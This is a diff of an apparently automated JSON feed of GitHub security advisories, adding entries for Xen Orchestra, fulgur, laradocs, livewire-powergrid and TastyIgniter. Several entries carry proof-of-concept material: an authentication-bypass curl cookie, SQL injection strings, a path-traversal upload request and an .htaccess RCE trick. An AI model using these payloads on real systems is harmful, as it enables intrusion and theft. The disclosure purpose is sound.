@@ -1,6 +1,6 @@
 {
-  "generatedAt": "2026-11-25T16:45:14.314Z",
-  "count": 576,
+  "generatedAt": "2026-11-26T01:30:49.998Z",
+  "count": 583,
   "advisories": [
     {
       "id": "CVE-2025-24893",
@@ -1639,6 +1639,44 @@
       ],
       "kev": true,
       "epss": 0.0137
+    },
+    {
+      "id": "CVE-2026-133469",
+      "ghsaId": "GHSA-2r3w-c2vx-fv5g",
+      "cve": "CVE-2026-133469",
+      "cwe": "CWE-287",
+      "sev": "critical",
+      "summary": "Xen Orchestra: Empty-object login token",
+      "description": "### Summary\n\nREST cookie parsing turns `authenticationToken=j:%7B%7D` into `{}`. REST authentication passes that object to the XO token provider without requiring a string. The token collection treats `{}` as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated `/rest/v0/users/me/authentication_tokens` route then returns reusable login token IDs.\n\n\n### Details\n\n1. In `packages/xo-server/src/api/session.mjs`, function  `signIn(credentials)` has **no `params` schema** (unlike the deprecated `signInWithToken`, which declares `token: { type: 'string' }`), so `credentials.token` can be any JSON value.\n2. `packages/xo-server/src/xo-mixins/authentication.mjs`, token provider:\n   ```js\n   this.registerAuthenticationProvider(async ({ token: tokenId }, { ip } = {}) => {\n     if (!tokenId) return          // {} is truthy → passes\n     const token = await app.getAuthenticationToken(tokenId)\n     ...\n     return { bypassOtp: true, expiration: token.expiration, userId: token.user_id }\n   ```\n3. `getAuthenticationToken(properties)` explicitly accepts an object, and `_getAuthenticationToken(id, properties)` does `this._tokens.first(properties ?? id)`.\n4. `Collection#first(properties)` -> `_get(properties)`; in `collection/redis.mjs`, `if (isEmpty(properties)) return redis.sMembers(prefix + '_ids')…` → **all tokens**. Non-empty objects on indexed fields (`user_id`, `client_id`) do an index lookup → token of the chosen user.\n5. HTTP paths: `index.mjs` (`req.cookies.token` → `isValidAuthenticationToken`), `xo-mixins/rest-api.mjs` and `@xen-orchestra/rest-api` middleware (`cookies.authenticationToken ?? cookies.token` → `authenticateUser({ token })`). `cookie-parser` turns `j:`-prefixed cookie values into parsed JSON, so `authenticationToken=j:{}` yields `{}`.\n\n\n### Proof of concept\n\nThe object cookie returned 200 with unexpired token IDs, and one ID worked on a fresh request as an admin account. The attacker does not choose which token the empty-object lookup returns. Authentication succeeds only if the token returned first is unexpired and belongs to an existing user; if it is expired or its user was deleted, the request fails without trying another token.\n\n```bash\ncurl -b 'authenticationToken=j:{}' https://<ip>/rest/v0/users\n```\n\n### Impact\n\nAn adversary can bypass authentication and perform actions with 'Admin' privilege. Xen Orchestra compromise can lead to arbitrary code execution on man",
+      "publishedAt": "2026-11-23T17:29:29Z",
+      "updatedAt": "2026-11-23T17:29:30Z",
+      "url": "https://github.com/advisories/GHSA-2r3w-c2vx-fv5g",
+      "references": [
+        "https://github.com/vatesfr/xen-orchestra/security/advisories/GHSA-2r3w-c2vx-fv5g",
+        "https://github.com/vatesfr/xen-orchestra/pull/10748",
+        "https://github.com/vatesfr/xen-orchestra/commit/50166fe3a49c02069d35ba9046ca4a1f77f4e11d",
+        "https://docs.vates.tech/security-advisories/advisories/2026/vates-sa-2026-062",
+        "https://github.com/advisories/GHSA-2r3w-c2vx-fv5g"
+      ],
+      "patchUrls": [
+        "https://github.com/vatesfr/xen-orchestra/pull/10748",
+        "https://github.com/vatesfr/xen-orchestra/commit/50166fe3a49c02069d35ba9046ca4a1f77f4e11d"
+      ],
+      "packages": [
+        {
+          "ecosystem": "npm",
+          "name": "xo-server",
+          "le": "5.7.4",
+          "id": "CVE-2026-133469",
+          "ghsaId": "GHSA-2r3w-c2vx-fv5g",
+          "cve": "CVE-2026-133469",
+          "cwe": "CWE-287",
+          "sev": "critical",
+          "note": "Xen Orchestra: Empty-object login token"
+        }
+      ],
+      "kev": true,
+      "epss": 0.011
     },
     {
       "id": "CVE-2026-55255",
@@ -5482,44 +5520,6 @@
       "epss": 0.0111
     },
     {
-      "id": "CVE-2026-133469",
-      "ghsaId": "GHSA-2r3w-c2vx-fv5g",
-      "cve": "CVE-2026-133469",
-      "cwe": "CWE-287",
-      "sev": "critical",
-      "summary": "Xen Orchestra: Empty-object login token",
-      "description": "### Summary\n\nREST cookie parsing turns `authenticationToken=j:%7B%7D` into `{}`. REST authentication passes that object to the XO token provider without requiring a string. The token collection treats `{}` as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated `/rest/v0/users/me/authentication_tokens` route then returns reusable login token IDs.\n\n\n### Details\n\n1. In `packages/xo-server/src/api/session.mjs`, function  `signIn(credentials)` has **no `params` schema** (unlike the deprecated `signInWithToken`, which declares `token: { type: 'string' }`), so `credentials.token` can be any JSON value.\n2. `packages/xo-server/src/xo-mixins/authentication.mjs`, token provider:\n   ```js\n   this.registerAuthenticationProvider(async ({ token: tokenId }, { ip } = {}) => {\n     if (!tokenId) return          // {} is truthy → passes\n     const token = await app.getAuthenticationToken(tokenId)\n     ...\n     return { bypassOtp: true, expiration: token.expiration, userId: token.user_id }\n   ```\n3. `getAuthenticationToken(properties)` explicitly accepts an object, and `_getAuthenticationToken(id, properties)` does `this._tokens.first(properties ?? id)`.\n4. `Collection#first(properties)` -> `_get(properties)`; in `collection/redis.mjs`, `if (isEmpty(properties)) return redis.sMembers(prefix + '_ids')…` → **all tokens**. Non-empty objects on indexed fields (`user_id`, `client_id`) do an index lookup → token of the chosen user.\n5. HTTP paths: `index.mjs` (`req.cookies.token` → `isValidAuthenticationToken`), `xo-mixins/rest-api.mjs` and `@xen-orchestra/rest-api` middleware (`cookies.authenticationToken ?? cookies.token` → `authenticateUser({ token })`). `cookie-parser` turns `j:`-prefixed cookie values into parsed JSON, so `authenticationToken=j:{}` yields `{}`.\n\n\n### Proof of concept\n\nThe object cookie returned 200 with unexpired token IDs, and one ID worked on a fresh request as an admin account. The attacker does not choose which token the empty-object lookup returns. Authentication succeeds only if the token returned first is unexpired and belongs to an existing user; if it is expired or its user was deleted, the request fails without trying another token.\n\n```bash\ncurl -b 'authenticationToken=j:{}' https://<ip>/rest/v0/users\n```\n\n### Impact\n\nAn adversary can bypass authentication and perform actions with 'Admin' privilege. Xen Orchestra compromise can lead to arbitrary code execution on man",
-      "publishedAt": "2026-11-23T17:29:29Z",
-      "updatedAt": "2026-11-23T17:29:30Z",
-      "url": "https://github.com/advisories/GHSA-2r3w-c2vx-fv5g",
-      "references": [
-        "https://github.com/vatesfr/xen-orchestra/security/advisories/GHSA-2r3w-c2vx-fv5g",
-        "https://github.com/vatesfr/xen-orchestra/pull/10748",
-        "https://github.com/vatesfr/xen-orchestra/commit/50166fe3a49c02069d35ba9046ca4a1f77f4e11d",
-        "https://docs.vates.tech/security-advisories/advisories/2026/vates-sa-2026-062",
-        "https://github.com/advisories/GHSA-2r3w-c2vx-fv5g"
-      ],
-      "patchUrls": [
-        "https://github.com/vatesfr/xen-orchestra/pull/10748",
-        "https://github.com/vatesfr/xen-orchestra/commit/50166fe3a49c02069d35ba9046ca4a1f77f4e11d"
-      ],
-      "packages": [
-        {
-          "ecosystem": "npm",
-          "name": "xo-server",
-          "le": "5.7.4",
-          "id": "CVE-2026-133469",
-          "ghsaId": "GHSA-2r3w-c2vx-fv5g",
-          "cve": "CVE-2026-133469",
-          "cwe": "CWE-287",
-          "sev": "critical",
-          "note": "Xen Orchestra: Empty-object login token"
-        }
-      ],
-      "kev": false,
-      "epss": 0.011
-    },
-    {
       "id": "CVE-2026-69260",
       "ghsaId": "GHSA-w3f2-pr6x-wwjc",
       "cve": "CVE-2026-69260",
@@ -8439,6 +8439,50 @@
       "epss": 0.0069
     },
     {
+      "id": "CVE-2026-68539",
+      "ghsaId": "GHSA-vw2v-g4x7-xcqg",
+      "cve": "CVE-2026-68539",
+      "cwe": "CWE-400",
+      "sev": "high",
+      "summary": "fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)",
+      "description": "`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that\nprocesses input supplied by many tenants. In versions from 0.4.4 up to (but not\nincluding) the patched release, the CSS `string-set` named-string values\nresolved from a document were accumulated per element with no memory budget,\nletting a small crafted document amplify into large retained memory (and the CPU\nto copy it) — a denial of service.\n\nA `string-set` value is attacker-controlled: it is resolved from an element's\nown text (`content(text)`), from one of its attributes (`attr(...)`), or from a\nCSS string literal. fulgur accumulated these values per element in two unbounded\nplaces:\n\n1. **Store (default path).** For every element that matches a `string-set` rule,\n   fulgur pushes a copy of the resolved value into a store that is retained for\n   the whole render and cloned again downstream into a per-node lookup map. This\n   happens on the ordinary render path with no opt-in. A single literal reused\n   across many elements therefore expands from one copy in the input to N copies\n   in memory:\n\n   ```html\n   <style>\n     p { string-set: title \"……a large literal value……\" }\n   </style>\n   <p></p>  <!-- repeated N times -->\n   ```\n\n   The store grows to roughly `value_size × N` bytes (and ~3× that across the\n   downstream clones) from an input whose large part appears only once — a\n   breadth-unbounded amplification.\n\n2. **Per-node snapshot (bookmark / cross-reference path).** When PDF bookmarks\n   (`bookmark-label: string(...)`) or CSS `target-*` references are in play,\n   fulgur additionally cloned the full running `name → value` map at every\n   visited element so `string()` can resolve at that position. One large value\n   is then re-cloned at each of N following elements — an `O(N × value_size)`\n   retained-memory sink. This is the string counterpart of the counter-snapshot\n   sink fixed in\n   [GHSA-395p-pj7r-jm42](https://github.com/fulgur-rs/fulgur/security/advisories/GHSA-395p-pj7r-jm42);\n   that fix bounded the counter snapshots but did not bound this string twin.\n\nAn attacker able to submit HTML/CSS to a fulgur-based conversion service can\ntrigger memory and CPU exhaustion with a trivially small payload, denying\nservice to the host and any co-tenants.\n\n## Patches\n\nFixed in **0.28.0**. The aggregate of each sink is now separately bounded: the\nresolved `string-set` store (`MAX_STRING_SET_STORE_BYTES`) and the retained\nper-node named-string snapshots (`MAX_STRING_SNAPSHOT_BYTES`).",
+      "publishedAt": "2026-11-25T19:46:45Z",
+      "updatedAt": "2026-11-25T19:46:46Z",
+      "url": "https://github.com/advisories/GHSA-vw2v-g4x7-xcqg",
+      "references": [
+        "https://github.com/fulgur-rs/fulgur/security/advisories/GHSA-vw2v-g4x7-xcqg",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-68539",
+        "https://github.com/fulgur-rs/fulgur/pull/582",
+        "https://github.com/fulgur-rs/fulgur/pull/584",
+        "https://github.com/fulgur-rs/fulgur/commit/1c4cdad003daef7c9dc6ef1362c50bcfaac13ea9",
+        "https://github.com/fulgur-rs/fulgur/commit/9248fbfd91a2ba8fc3dbd9e44ba681f52ed1ecd0",
+        "https://github.com/fulgur-rs/fulgur/releases/tag/v0.29.0",
+        "https://github.com/advisories/GHSA-vw2v-g4x7-xcqg"
+      ],
+      "patchUrls": [
+        "https://github.com/fulgur-rs/fulgur/pull/582",
+        "https://github.com/fulgur-rs/fulgur/pull/584",
+        "https://github.com/fulgur-rs/fulgur/commit/1c4cdad003daef7c9dc6ef1362c50bcfaac13ea9",
+        "https://github.com/fulgur-rs/fulgur/commit/9248fbfd91a2ba8fc3dbd9e44ba681f52ed1ecd0"
+      ],
+      "packages": [
+        {
+          "ecosystem": "cargo",
+          "name": "fulgur",
+          "ge": "0.4.4",
+          "lt": "0.28.0",
+          "id": "CVE-2026-68539",
+          "ghsaId": "GHSA-vw2v-g4x7-xcqg",
+          "cve": "CVE-2026-68539",
+          "cwe": "CWE-400",
+          "sev": "high",
+          "note": "fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)"
+        }
+      ],
+      "kev": false,
+      "epss": 0.0068
+    },
+    {
       "id": "CVE-2026-77367",
       "ghsaId": "GHSA-hq2p-f2vj-v3cm",
       "cve": "CVE-2026-77367",
@@ -9544,6 +9588,44 @@
       ],
       "kev": false,
       "epss": 0.0064
+    },
+    {
+      "id": "CVE-2026-65973",
+      "ghsaId": "GHSA-h746-qpxh-ph7g",
+      "cve": "CVE-2026-65973",
+      "cwe": "CWE-78",
+      "sev": "medium",
+      "summary": "laradocs Command injection via unescaped Node.js binary path in KaTeX SSR",
+      "description": "### Summary\nLocal command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.\n\n### Affected versions\n>= 0.4.0, < 1.0.0\n\n### Patched versions\n>= 1.0.0 (fixed in commit `100cb1e`)\n\n### Impact\nWhen rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.\n\n`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:\n\n```php\n$node = $this->nodeBin ?? 'node';\n$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources — the configured `node_bin` value, or the `'node'` default resolved from `PATH` — are operator-controlled. Neither is derived from untrusted request data or documentation content.\n\nThe vulnerable branch is reached only when server-side rendering is enabled. The default KaTeX path is client-side (browser-rendered via the configured `js`/`css` assets) and never calls `proc_open()`. SSR is opt-in via `laradocs.parser.katex.ssr`, which ships **disabled**.\n\n### Exploit scenario\nExploitation requires SSR to be turned on **and** an untrusted party to control `laradocs.parser.katex.node_bin` or the process `PATH` — a precondition that on its own already implies code execution on the host.\n\n### Severity\n**Low.** This is best treated as a hardening / defence-in-depth fix rather than a remotely exploitable RCE, since no untrusted input (request data, documentation content, or network input) reaches the vulnerable code path under normal operation.\n\n### Patch\nThe Node binary argument is now passed through `escapeshellarg()` like the other command components:\n\n```php\n$cmd = escapeshellarg($node) . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n### Credit\nReported via automated security scanning (Aikido).",
+      "publishedAt": "2026-11-25T19:41:53Z",
+      "updatedAt": "2026-11-25T19:41:55Z",
+      "url": "https://github.com/advisories/GHSA-h746-qpxh-ph7g",
+      "references": [
+        "https://github.com/PeteBishwhip/laradocs/security/advisories/GHSA-h746-qpxh-ph7g",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-65973",
+        "https://github.com/PeteBishwhip/laradocs/commit/100cb1e83920b8d3c9d8d53f98712df80df99435",
+        "https://github.com/PeteBishwhip/laradocs/releases/tag/v1.0.0",
+        "https://github.com/advisories/GHSA-h746-qpxh-ph7g"
+      ],
+      "patchUrls": [
+        "https://github.com/PeteBishwhip/laradocs/commit/100cb1e83920b8d3c9d8d53f98712df80df99435"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "petebishwhip/laradocs",
+          "ge": "0.4.0",
+          "lt": "1.0.0",
+          "id": "CVE-2026-65973",
+          "ghsaId": "GHSA-h746-qpxh-ph7g",
+          "cve": "CVE-2026-65973",
+          "cwe": "CWE-78",
+          "sev": "medium",
+          "note": "laradocs Command injection via unescaped Node.js binary path in KaTeX SSR"
+        }
+      ],
+      "kev": false,
+      "epss": 0.0063
     },
     {
       "id": "CVE-2026-130176",
@@ -19113,6 +19195,44 @@
       "epss": 0.0036
     },
     {
+      "id": "CVE-2026-65971",
+      "ghsaId": "GHSA-7fgc-3h6c-698r",
+      "cve": "CVE-2026-65971",
+      "cwe": "CWE-89",
+      "sev": "high",
+      "summary": "livewire-powergrid: SQL injection via sortDirection in naturalSort queries",
+      "description": "## [Description]\n\nThe public Livewire property `sortDirection` is interpolated **verbatim** into a\nraw SQL `ORDER BY` clause and is not restricted to `asc`/`desc`, allowing arbitrary\nSQL injection through `POST /livewire/update`.\n\n**Data flow**\n\n- **Source** — `src/Concerns/Sorting.php`: `public string $sortDirection;` is a\n  Livewire-bound property with no whitelist/validation (it is only assigned and\n  flipped by `reverseSort()`), so it is fully attacker-controlled via the standard\n  Livewire update endpoint.\n- **Taint** — `src/DataSource/Processors/Database/Pipelines/ColumnRawQueries.php`,\n  `resolvePlaceholders()`:\n  ```php\n  preg_replace_callback('/\\{(\\w+)\\}/', fn ($m) => data_get($this->component, $m[1], ''), $sql);\n  ```\n  substitutes `{sortDirection}` with the raw property value.\n- **Sink** — `src/DataSource/Support/Sql.php::getSortSqlByDriver()` builds the\n  `naturalSort` expression, e.g. `\"... {sortDirection}\"` / `\"CAST(...) {sortDirection}\"`,\n  which is passed to `orderByRaw()`. The tainted direction lands directly in the SQL\n  string.\n\n**Why the framework mitigation does not apply (the bypass)**\n\nNormally the `Sorting` pipeline calls `orderBy(resolveSortField($sortField), $sortDirection)`,\nand Laravel validates the direction (`Order direction must be \"asc\" or \"desc\".`).\nSetting **`sortField=\"\"`** makes the `Sorting` pipeline skip (`filled('')` is false),\nso the validating `orderBy` never runs — but the `ColumnRawQueries` pipeline still\napplies the `naturalSort` `orderByRaw` unconditionally with the attacker-controlled\n`{sortDirection}`. The result is arbitrary SQL in the `ORDER BY`, bypassing Laravel's\ndirection validation entirely.\n\n## [Proof of Concept]\n\nLab: Laravel 11.53 + Livewire 3.8 + livewire-powergrid 6.10 + MariaDB, with a\nPowerGrid table whose `name` column uses `->naturalSort(true)`.\n\nRequest (standard Livewire update; CSRF token taken from the page as any Livewire call):\n```\nPOST /livewire/update\ncomponents[0].snapshot = <the PowerGrid component snapshot from the page>\ncomponents[0].updates  = {\"sortField\": \"\", \"sortDirection\": \"asc, (SELECT SLEEP(3))\"}\n```\n\nObserved results:\n\n- **Error-based** (HTTP 500, `SQLSTATE[HY000] 1105`) — the injected subquery reaches\n  the database verbatim:\n  ```\n  select * from `rooms` order by CAST(NULLIF(REGEXP_REPLACE(name, ...) ...) asc,\n    (select extractvalue(1, concat(0x7e, (select secret from rooms limit 1)))) limit 3 offset 0\n  ```\n- **Blind time-based** (arbitrary data extraction):\n  ```\n  as",
+      "publishedAt": "2026-11-25T19:44:57Z",
+      "updatedAt": "2026-11-25T19:44:58Z",
+      "url": "https://github.com/advisories/GHSA-7fgc-3h6c-698r",
+      "references": [
+        "https://github.com/Power-Components/livewire-powergrid/security/advisories/GHSA-7fgc-3h6c-698r",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-65971",
+        "https://github.com/Power-Components/livewire-powergrid/commit/13d047bf1637e82926e6914aa3ca0f29a4c9704a",
+        "https://github.com/Power-Components/livewire-powergrid/releases/tag/v6.10.4",
+        "https://github.com/advisories/GHSA-7fgc-3h6c-698r"
+      ],
+      "patchUrls": [
+        "https://github.com/Power-Components/livewire-powergrid/commit/13d047bf1637e82926e6914aa3ca0f29a4c9704a"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "power-components/livewire-powergrid",
+          "ge": "6.0.0",
+          "lt": "6.10.4",
+          "id": "CVE-2026-65971",
+          "ghsaId": "GHSA-7fgc-3h6c-698r",
+          "cve": "CVE-2026-65971",
+          "cwe": "CWE-89",
+          "sev": "high",
+          "note": "livewire-powergrid: SQL injection via sortDirection in naturalSort queries"
+        }
+      ],
+      "kev": false,
+      "epss": 0.0035
+    },
+    {
       "id": "CVE-2026-109549",
       "ghsaId": "GHSA-w3w6-9m25-g88p",
       "cve": "CVE-2026-109549",
@@ -24658,6 +24778,150 @@
       ],
       "kev": false,
       "epss": 0.0009
+    },
+    {
+      "id": "CVE-2026-69181",
+      "ghsaId": "GHSA-rj59-9f77-mvg5",
+      "cve": "CVE-2026-69181",
+      "cwe": "CWE-23",
+      "sev": "high",
+      "summary": "TastyIgniter permits Path Traversal in Media Upload",
+      "description": "### Summary\nArbitrary file write outside `media/uploads/`\n\n### Details\nIt is possible to perform Path Traversal in Media Manager file upload function as admin.\n\n\n### PoC\n- login as admin\n- upload a image but in the request, change the path from `/` to `/../../`.\n\nRequest\n```http\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 302\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4NFBlOUpUWTNLRGc9PSIsInZhbHVlIjoiaU1KZzErLzJoQ3dsSVRnbkptUE5YcmN6cFk1eVJoNWZlSVZzeFlqcVVlQThDWGc1S2FUS1hGMEFsa1Bsb0RvVE12T1VoTEdKOFpQRm5XMXMrSG1ONTI5T0U2UW5KMFAxRHRTWXA2eFNYSm9xaldlMkZrbHl5aSs3K21hQjBveWEiLCJtYWMiOiI5MzY4NzNhODQ3NjlkNDgzMzc0N2FkZjM0YTJjMDI5MTBhZjc3MmZiNzI2YTc3NTBmNWY2OTFiNTBmMGRlNDg4IiwidGFnIjoiIn0%3D; tastyigniter_session=eyJpdiI6ImpoQldjRHJMTlJCMXlxVWVnbmt4QUE9PSIsInZhbHVlIjoicS9nRENOZDgvRURBL2kvM1VSOTFmaFgzcEtyVVNZK3pMLzBxL2NnU3MwVUIvaW0zMmhacWRvYnMzUzF2NXhDenZ1MFZkK1ErZ0FscGl",
+      "publishedAt": "2026-11-25T22:54:30Z",
+      "updatedAt": "2026-11-25T22:54:30Z",
+      "url": "https://github.com/advisories/GHSA-rj59-9f77-mvg5",
+      "references": [
+        "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-rj59-9f77-mvg5",
+        "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f",
+        "https://github.com/tastyigniter/core/releases/tag/v4.3.1",
+        "https://github.com/advisories/GHSA-rj59-9f77-mvg5"
+      ],
+      "patchUrls": [
+        "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "tastyigniter/tastyigniter",
+          "lt": "4.3.1",
+          "id": "CVE-2026-69181",
+          "ghsaId": "GHSA-rj59-9f77-mvg5",
+          "cve": "CVE-2026-69181",
+          "cwe": "CWE-23",
+          "sev": "high",
+          "note": "TastyIgniter permits Path Traversal in Media Upload"
+        }
+      ],
+      "kev": false,
+      "epss": 0
+    },
+    {
+      "id": "CVE-2026-69179",
+      "ghsaId": "GHSA-7wwv-x6mc-pxqx",
+      "cve": "CVE-2026-69179",
+      "cwe": "CWE-434",
+      "sev": "critical",
+      "summary": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
+      "description": "### Summary\nMedia manager accepts `.htaccess` file which can be used to perform RCE.\n\n### Details\nThe file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.\n\n### PoC\n- Login as Admin\n- Create a `.htaccess` file with the following code.\n\n```\n<FilesMatch \"\\.jpg$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n- Upload the `.htaccess` file via the Media Manager.\n\nRequest\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 357\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4NFBlOUpUWTNLRGc9PSIsInZhbHVlIjoiaU1KZzErLzJoQ3dsSVRnbkptUE5YcmN6cFk1eVJoNWZlSVZzeFlqcVVlQThDWGc1S2FUS1hGMEFsa1Bsb0RvVE12T1VoTEdKOFpQRm5XMXMrSG1ONTI5T0U2UW5KMFAxRHRTWXA2eFNYSm9xaldlMkZrbHl5aSs3K21hQjBveWEiLCJtYWMiOiI5MzY4NzNhODQ3NjlkNDgzMzc0N2FkZjM0YTJjMDI5MTB",
+      "publishedAt": "2026-11-25T22:24:36Z",
+      "updatedAt": "2026-11-25T22:24:37Z",
+      "url": "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx",
+      "references": [
+        "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-7wwv-x6mc-pxqx",
+        "https://github.com/tastyigniter/TastyIgniter/commit/74299ffb635744354e7056242c4cd84d5479a120",
+        "https://github.com/tastyigniter/TastyIgniter/releases/tag/v4.3.1",
+        "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx"
+      ],
+      "patchUrls": [
+        "https://github.com/tastyigniter/TastyIgniter/commit/74299ffb635744354e7056242c4cd84d5479a120"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "tastyigniter/tastyigniter",
+          "lt": "4.3.1",
+          "id": "CVE-2026-69179",
+          "ghsaId": "GHSA-7wwv-x6mc-pxqx",
+          "cve": "CVE-2026-69179",
+          "cwe": "CWE-434",
+          "sev": "critical",
+          "note": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager"
+        }
+      ],
+      "kev": false,
+      "epss": 0
+    },
+    {
+      "id": "CVE-2026-69178",
+      "ghsaId": "GHSA-743w-g9pf-8p94",
+      "cve": "CVE-2026-69178",
+      "cwe": "CWE-1336",
+      "sev": "critical",
+      "summary": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
